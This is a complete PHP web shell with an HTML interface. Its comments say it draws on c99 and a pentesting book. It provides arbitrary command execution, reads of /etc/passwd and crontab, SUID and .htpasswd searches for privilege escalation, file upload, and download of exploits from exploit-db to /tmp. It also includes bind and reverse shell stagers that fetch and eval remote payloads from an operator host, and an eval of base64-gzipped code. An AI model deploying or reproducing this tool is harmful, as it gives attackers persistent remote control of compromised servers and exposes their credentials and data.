<html>
<head>
<body>
<title>Web Shell @<?php echo $_SERVER["HTTP_HOST"]; echo " "; myshellexec("uname -a"); echo " Location:";echo $_SERVER['SCRIPT_FILENAME']; ?></title>
<!-- webshell code taken from c99 and example webshell from the book Coding from pentesting. No backdoors - Tested on Linux-->
 <style type="text/css">
  body {
    padding-left: 11em;
    font-family: Georgia, "Times New Roman",
          Times, serif;
    color: white;
    background-color: black}
 pre {
    padding-left: 1em;
    font-family: "Courier New";
    color: white;
    background-color: #060606 }
  ul.navbar {
    list-style-type: none;
    padding: 0;
    margin: 0;
    position: absolute;
    top: 2em;
    left: 1em;
    width: 9em
 }
  h1 {
    font-family: Georgia, "Times New Roman",
          Times, serif;
     }
  h4 {
    font-family: "Arial"; 
     color: white;
     }
 h5 {
    color: #F24D00 }
  ul.navbar li {
    background: white;
    margin: 0.5em 0;
    border-right: 1em solid black }
  ul.navbar a {
    text-decoration: none }
  a:link {
    color: red }
  a:visited {
    color: orange }

  </style>
<H4> Current Date </H4>
<script type="text/javascript">
document.write("<pre>" + Date() + "</pre>");

</script>


<H4> System Info </H4>

<?php
echo "<pre>";
echo "<H5> OS Version [via uname]</H5>";
myshellexec("uname -a");
@$kernelversion=myshellexec("uname -r");
echo "<hr>";
?>
List of Local Priv Escalation Exploits
<?php echo "<a href=http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$kernelversion&filter_exploit_text=linux&filter_author=&filter_platform=0&filter_type=2&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=  target='_blank'>Results</a>";
?>

<?php
echo "<H5>Operating System [via PHP and lsb-release]:</H5>"; 
echo PHP_OS;
echo "<br/>";
passthru("lsb_release -a");
echo "<br/>";
echo "<hr>";
?>
<?php
echo "<H5> Internet Address and Hostname</H5>";
echo $_SERVER["HTTP_HOST"];echo " : "; myshellexec("hostname");
echo "<H5> Userid Running </H5>";
myshellexec("id");
echo "<H5>PHP Version and Safe Mode Status:</H5>";
echo PHP_VERSION;
echo "<br>";
echo "Execute Shell Command (safe mode is ";
echo (@ini_get('safe_mode') ? 'ON' : 'OFF');
echo ")";
?>
<?php 
echo "<H5>Tools Installed:</H5>";
myshellexec("which python perl ruby gcc nmap nc msfconsole");
echo "<br />";
//echo phpinfo();
echo "</pre>";


echo "<p>";

?>
<?php
if(isset($_REQUEST['phpinfo']))
{
    phpinfo();
}

if(isset($_REQUEST['passwd']))
{
    echo "<H5> Passwd file </H5>";
    echo "<pre>";
    //myshellexec("cat /etc/passwd");
    $file = "/etc/passwd";
    $fp = fopen($file,"r") or die ("Cannot open file");
    $dataStr = fread($fp, filesize($file));
    echo $dataStr;
    fclose($fp);
    echo "</pre>";
}

if(isset($_REQUEST['crontab']))
{
    echo "<H5> Crontab file </H5>";
    echo "<pre>";
    $file = "/etc/crontab";
    $fp = fopen($file,"r") or die ("Cannot open file");
    $dataStr = fread($fp, filesize($file));
    echo $dataStr;
    fclose($fp);
    echo "</pre>";
}

if(isset($_REQUEST['inetd']))
{
    echo "<H5> Crontab file </H5>";
    echo "<pre>";
    $file = "/etc/inetd.conf";
    $fp = fopen($file,"r") or die ("Cannot open file");
    $dataStr = fread($fp, filesize($file));
    echo $dataStr;
    fclose($fp);
    echo "</pre>";
}

if(isset($_REQUEST['netstat']))
{
    echo "<H5> Netstat </H5>";
    echo "<pre>";
    myshellexec("netstat -punta");
    echo "</pre>";
}
if(isset($_REQUEST['privesc']))
{
   
    //echo "<H5> Kernel Version </H5>";
    //echo "<pre>";
    //myshellexec('sysctl -a | grep version');
    //echo "</pre>";
    echo "<H5> Suids files </H5>";
    echo "<pre>";
    myshellexec("find / -type f -perm -04000 -ls");
//popen or passthru is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); 
    echo "</pre>";
    echo "<H5> Sguids files </H5>";
    echo "<pre>";
    myshellexec("find / -type f -perm -02000 -ls");
    echo "</pre>";
    echo "<H5> .htpasswd files </H5>";
    echo "<pre>";
    myshellexec("find / -type f -name .htpasswd");
    echo "</pre>";
    echo "<H5> World Writeable Files </H5>";
    echo "<pre>";
    myshellexec("find / -perm -2 -ls");
    echo "</pre>";
    

}

if(isset($_REQUEST['open']))
{
    echo "<H5> Open Ports </H5>";
    echo "<pre>";
    myshellexec("netstat -an | grep -i listen");
    echo "</pre>";
}


if(isset($_REQUEST['bind']))
{
       echo "<script> alert('Bind Shell Died');</script>";
    
	if(isset($_REQUEST['port']))
	{
	$port=$_REQUEST['port'];
	    
	     
	# The payload handler overwrites this with the correct LPORT before sending
	# it to the victim.
	$ipaddr = "0.0.0.0";

	if (is_callable('stream_socket_server')) {
		$srvsock = stream_socket_server("tcp://{$ipaddr}:{$port}");
		if (!$srvsock) { die(); }
		$s = stream_socket_accept($srvsock, -1);
		$s_type = 'stream';
	} elseif (is_callable('socket_create_listen')) {
		$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
		if (!$res) { die(); }
		$s = socket_accept($srvsock);
		$s_type = 'socket';
	} elseif (is_callable('socket_create')) {
		$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		$res = socket_bind($srvsock, $ipaddr, $port);
		if (!$res) { die(); }
		$s = socket_accept($srvsock);
		$s_type = 'socket';
	} else {
		die();
	}
	if (!$s) { die(); }

	switch ($s_type) { 
	case 'stream': $len = fread($s, 4); break;
	case 'socket': $len = socket_read($s, 4); break;
	}
	if (!$len) {
		# We failed on the main socket.  There's no way to continue, so
		# bail
		die();
	}
	$a = unpack("Nlen", $len);
	$len = $a['len'];

	$b = '';
	while (strlen($b) < $len) {
		switch ($s_type) { 
		case 'stream': $b .= fread($s, $len-strlen($b)); break;
		case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
		}
	}

	# Set up the socket for the main stage to use.
	$GLOBALS['msgsock'] = $s;
	$GLOBALS['msgsock_type'] = $s_type;
	eval($b);
	die();

	}
}

if(isset($_REQUEST['reverse']))
{

	echo "<script> alert('Reverse Shell Died');</script>";
	if(isset($_REQUEST['port']))
	{
	    $port=$_REQUEST['port'];
	    $ip=$_REQUEST['ip'];	

	error_reporting(0);
	# The payload handler overwrites this with the correct LHOST before sending
	# it to the victim.


	if (FALSE !== strpos($ip, ":")) {
		# ipv6 requires brackets around the address
		$ip = "[". $ip ."]";
	}

	if (($f = 'stream_socket_client') && is_callable($f)) {
		$s = $f("tcp://{$ip}:{$port}");
		$s_type = 'stream';
	} elseif (($f = 'fsockopen') && is_callable($f)) {
		$s = $f($ip, $port);
		$s_type = 'stream';
	} elseif (($f = 'socket_create') && is_callable($f)) {
		$s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
		$res = @socket_connect($s, $ip, $port);
		if (!$res) { die(); }
		$s_type = 'socket';
	} else {
		die('no socket funcs');
	}
	if (!$s) { die('no socket'); }

	switch ($s_type) { 
	case 'stream': $len = fread($s, 4); break;
	case 'socket': $len = socket_read($s, 4); break;
	}
	if (!$len) {
		# We failed on the main socket.  There's no way to continue, so
		# bail
		die();
	}
	$a = unpack("Nlen", $len);
	$len = $a['len'];

	$b = '';
	while (strlen($b) < $len) {
		switch ($s_type) { 
		case 'stream': $b .= fread($s, $len-strlen($b)); break;
		case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
		}
	}

	# Set up the socket for the main stage to use.
	$GLOBALS['msgsock'] = $s;
	$GLOBALS['msgsock_type'] = $s_type;
	eval($b);
	die();
	}
}

?>
<ul class="navbar">
<H4> Execute Commands</H4>
<a href="javascript:history.go(-1)">Go Back</a></br>
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?phpinfo=true">Phpinfo</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?passwd=true">Passwd</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?crontab=true">Crontab</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?inetd=true">Inetd</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?netstat=true">Netstat</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?privesc=true">Privesc</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?open=true">Open Ports</a>
<br >

<H4> Get R00t </H4>
<H5> Search for Specific Exploit and View/Create Link/Download</H5>
<form action="<?php echo $_SERVER['SCRIPT_NAME'] ?>" method="get">
   Define Exploitid from Exploit-db.com: <br><input type="text" name="exploitid" size="7"/><input type="submit" value="Go" />
 </form>
<?php
if(isset($_REQUEST['exploitid']))
{
    
    echo "<H5>Results</H5>";
    $exploitid=$_REQUEST['exploitid'];
    $url="http://www.exploit-db.com/download/$exploitid/";
    $contents=file_get_contents($url); //fetch url exploit
    //echo "<H4>Running Kernel: "; $kernelversion=myshellexec("uname -r");echo "</H4>";
    echo "<a href=http://www.exploit-db.com/download/$exploitid/ > Exploit Download</a><br>";
    echo "<a href=http://www.exploit-db.com/exploits/$exploitid/ > Exploit Description</a><br>";
    echo "<a href=http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$kernelversion&filter_exploit_text=linux&filter_author=&filter_platform=0&filter_type=2&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve= target='_blank'> Exploit-db Results</a>";
$script=$_SERVER['SCRIPT_NAME'];
echo "<br><a href=$script?transfer=true&exploitid=$exploitid >Exploit Transfer</a><br />";


	if (isset($_REQUEST['transfer']) )
	{

	    $exploitid=$_REQUEST['exploitid'];
	    $transfer=$_REQUEST['transfer'];
	   
	    $localfile="/tmp/$exploitid";//write and transfer exploit to tmp
	     

		if (file_exists($localfile)) {
		    echo "<H5>File $localfile exists</H5>";
		} else {
		    
		 $fp=fopen($localfile, "w");
		 fwrite($fp, $contents) or exit("<H5>Unable to write exploit to /tmp</H5>"); //write contents of feed to cache file
		echo "<H5>Exploit transferred to $localfile.</H5>";

		}

		 fclose($fp);
		    
	}
    
}
?>



<H4>Metasploit Shells</H4>

<form action="<?php echo $_SERVER['SCRIPT_NAME'] ?>" method="get">
   LPORT: <input type="text" name="port" size="6" /></br>
   LHOST: <input type="text" name="ip" size="6" />
</br>
    <input type="submit" value="Set" />
 </form>
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?bind=true&port=<?php echo $_REQUEST['port']?>">Bind Shell</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?reverse=true&ip=<?php echo $_SERVER['REMOTE_ADDR'];?>&port=<?php echo $_REQUEST['port']?>">Reverse Shell</a>
<br />
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?reverse=true&ip=<?php echo $_REQUEST['ip'];?>&port=<?php echo $_REQUEST['port']?>">Reverse Shell</a>
<br />

<H4>Other Shells</H4>
<a href="<?php echo $_SERVER['SCRIPT_NAME']; ?>?bind=true&port=<?php echo $_REQUEST['port']?>">Bind Shell NC</a>
<br />
<H4> Upload File </H4>
 <form action="<?php echo $_SERVER['SCRIPT_NAME'] ?>" method="post"
 enctype="multipart/form-data">
 <label for="file">Filename:</label>
 <input type="file" name="file" id="file" size="10"/> 
 <br />
 <input type="submit" name="submit" value="Upload" />
 </form>



<?php
 if ($_FILES["file"]["size"] < 2000000)
   {
   if ($_FILES["file"]["error"] > 0)
     {
     echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
     }
   else
     {
     echo "<pre>";
     echo "Upload: " . $_FILES["file"]["name"] . "<br />";
     echo "Type: " . $_FILES["file"]["type"] . "<br />";
     echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
     echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";
     echo "</pre>";
     if (file_exists("upload/" . $_FILES["file"]["name"]))
       {
       echo $_FILES["file"]["name"] . " already exists. ";
       }
     else
       {
       move_uploaded_file($_FILES["file"]["tmp_name"],
       "upload/" . $_FILES["file"]["name"]);
       echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
       }
     }
   }
 else
   {
   echo "<pre>Invalid file</pre>";
   }


@eval(gzinflate(base64_decode($code)));
 ?>
</ul>


<script type="text/javascript">
var ta = document.getElementById("out");
ta.scrollTop = ta.scrollHeight;

var cmd = document.getElementById("command");
cmd.focus();
</script>
<H4> Command Execution </H4>
<?php 



if ($_POST['command'])
{

	if($_POST['out'])
	{
	
	$out = $_POST['out'] . "\n";
	 if (strlen($out) > 4000)
	 {
	  $out = substr($out.strlen($out) - 2000,2000);
	 }
	}

$out .= "> {$POST['command']}\n";
exec($_POST['command'],$data);
$out .= implode("\n",$data);

}

?>


<form action="<?php echo $_SERVER['SCRIPT_NAME'] ?>" method="post">
<textarea name="out" id="out" style="width: 100%; height:20%; background-color:black; color:green;"  >
<?php echo $out ?>
</textarea> <br>

Shell $: <input name="command" id="command" type="text" length="255" style="background-color:black; color:green;"><input type="submit" value="Execute">
</form>
<H4>Exploitid:<?echo $exploitid?></H4>
<pre>
<?php echo nl2br(htmlentities($contents));


?>
</pre>
<?php

$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc))
{
 $disablefunc = str_replace(" ","",$disablefunc);
 $disablefunc = explode(",",$disablefunc);
}

function myshellexec($cmd)//ripped from c99
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 echo $result;
}
?>
<p>

</head>
</body>
</html>



